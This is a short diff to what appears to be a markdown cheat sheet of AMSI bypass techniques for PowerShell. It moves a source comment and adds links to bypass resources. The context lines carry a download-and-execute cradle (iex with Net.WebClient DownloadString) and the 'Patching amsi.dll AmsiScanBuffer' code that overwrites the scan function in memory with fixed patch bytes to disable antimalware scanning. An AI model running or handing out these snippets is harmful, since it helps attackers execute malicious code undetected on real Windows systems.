@@ -12,7 +12,6 @@ iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 
 # Patching amsi.dll AmsiScanBuffer by rasta-mouse
 ```powershell
-# https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Patching-amsi.dll-AmsiScanBuffer-by-rasta-mouse
 $Win32 = @"
 
 using System;
@@ -41,3 +40,5 @@ $p = 0
 $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
 ```
+- [AMSI.fail](https://amsi.fail/)
+- [Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
